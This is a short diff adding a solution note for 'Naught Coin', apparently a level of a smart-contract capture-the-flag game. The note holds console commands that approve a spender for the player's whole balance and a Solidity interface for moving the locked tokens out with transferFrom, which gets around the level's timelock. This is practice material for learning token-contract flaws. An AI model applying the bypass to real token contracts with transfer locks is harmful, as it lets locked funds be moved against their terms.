@@ -1,0 +1,19 @@
+Level 15: Naught Coin
+
+
+totalBalance = await contract.balanceOf(player).then(v => v.toString())
+await contract.approve(spender, totalBalance)
+
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+interface INaughtCoin {
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint256 amount
+    ) external returns (bool);
+}
+
+call transferFrom with addresses and 1000000000000000000000000 
